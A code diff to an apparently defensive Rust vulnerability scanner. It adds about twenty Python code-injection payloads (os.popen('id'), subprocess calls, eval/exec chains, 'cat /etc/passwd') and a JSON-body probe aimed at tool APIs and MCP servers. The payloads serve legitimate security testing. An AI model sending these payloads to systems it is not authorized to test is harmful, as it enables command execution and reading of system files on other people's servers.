@@ -76,7 +76,32 @@ impl CodeInjectionScanner {
             tests_run += tests;
         }
 
+        // Test JSON body code injection (for tool APIs, MCP servers, AI agents)
+        // Context-aware: only test on endpoints that look like API endpoints
+        if vulnerabilities.is_empty() && self.is_api_endpoint(url) {
+            let (vulns, tests) = self.test_python_json_code_injection(url).await?;
+            vulnerabilities.extend(vulns);
+            tests_run += tests;
+        }
+
         Ok((vulnerabilities, tests_run))
+    }
+
+    /// Check if URL looks like an API endpoint (context-aware to reduce false positives)
+    fn is_api_endpoint(&self, url: &str) -> bool {
+        let url_lower = url.to_lowercase();
+        url_lower.contains("/api/")
+            || url_lower.contains("/v1/")
+            || url_lower.contains("/v2/")
+            || url_lower.contains("/tools/")
+            || url_lower.contains("/run")
+            || url_lower.contains("/execute")
+            || url_lower.contains("/eval")
+            || url_lower.contains("/invoke")
+            || url_lower.contains("/function")
+            || url_lower.contains("/rpc")
+            || url_lower.contains("/graphql")
+            || url_lower.ends_with(".json")
     }
 
     /// Test PHP eval() code injection
@@ -136,15 +161,36 @@ impl CodeInjectionScanner {
     /// Test Python exec()/eval() code injection
     async fn test_python_code_injection(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
         let mut vulnerabilities = Vec::new();
-        let tests_run = 4;
+        let tests_run = 20;
 
         info!("Testing Python code injection");
 
         let payloads = vec![
+            // Basic payloads
             format!("__import__('os').system('echo {}')", self.test_marker),
             format!("print('{}')", self.test_marker),
             "__import__('os').system('id')".to_string(),
             "1+1".to_string(),
+            // Advanced os.popen payloads (from real-world exploitation)
+            "import os\nos.popen('id').read()".to_string(),
+            "__import__('os').popen('id').read()".to_string(),
+            "__import__('os').popen('whoami').read()".to_string(),
+            "os.popen('id').read()".to_string(),
+            "os.popen('cat /etc/passwd').read()".to_string(),
+            // Function definition injection (for tool APIs)
+            "def exploit():\n    import os\n    return os.popen('id').read()".to_string(),
+            "def darkshadow():\n    import os\n    data='0'.encode('utf-8')\n    return '+os.popen('id').read()".to_string(),
+            // Subprocess module
+            "__import__('subprocess').check_output(['id'])".to_string(),
+            "__import__('subprocess').check_output('id',shell=True)".to_string(),
+            "__import__('subprocess').getoutput('id')".to_string(),
+            "__import__('subprocess').run(['whoami'],capture_output=True).stdout".to_string(),
+            // Eval/exec chain
+            "eval(compile('import os;os.system(\"id\")','','exec'))".to_string(),
+            "exec('import os;print(os.popen(\"id\").read())')".to_string(),
+            // builtins access
+            "__builtins__.__import__('os').popen('id').read()".to_string(),
+            "globals()['__builtins__']['__import__']('os').popen('id').read()".to_string(),
         ];
 
         for payload in payloads {
@@ -172,6 +218,56 @@ impl CodeInjectionScanner {
                 }
                 Err(e) => {
                     debug!("Request failed: {}", e);
+                }
+            }
+        }
+
+        Ok((vulnerabilities, tests_run))
+    }
+
+    /// Test Python code injection via JSON body (for tool APIs, MCP servers, etc.)
+    /// This is context-aware for JSON-based function/tool definitions
+    pub async fn test_python_json_code_injection(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
+        let mut vulnerabilities = Vec::new();
+        let tests_run = 5;
+
+        info!("Testing Python code injection via JSON body (tool API context)");
+
+        // Payloads specifically designed for source_code fields in tool APIs
+        let source_code_payloads = vec![
+            // Direct os module injection (as seen in real exploits)
+            r#"def exploit():\n    import os\n    return os.popen('id').read()"#,
+            r#"def darkshadow():\n    import os\n    data='0'.encode('utf-8')\n    return '+os.popen('id').read()"#,
+            r#"import os\nos.system('id')"#,
+            r#"__import__('os').popen('whoami').read()"#,
+            r#"exec('import os;print(os.popen(\"id\").read())')"#,
+        ];
+
+        for payload in source_code_payloads {
+            // JSON body with source_code field (common in tool APIs)
+            let json_body = format!(
+                r#"{{"name":"test","args":{{}},"json_schema":{{"type":"object","properties":{{}}}},"source_code":"{}"}}"#,
+                payload.replace('"', "\\\"").replace('\n', "\\n")
+            );
+
+            match self.http_client.post(url, json_body).await {
+                Ok(response) => {
+                    if self.detect_python_injection(&response.body) {
+                        info!("Python code injection via JSON body detected");
+                        vulnerabilities.push(self.create_vulnerability(
+                            url,
+                            "Python Code Injection (JSON API)",
+                            payload,
+                            "Python code executed via source_code field in JSON body",
+                            "Command output (uid=, gid=) detected in response",
+                            Severity::Critical,
+                            "CWE-94",
+                        ));
+                        break;
+                    }
+                }
+                Err(e) => {
+                    debug!("POST request failed: {}", e);
                 }
             }
         }
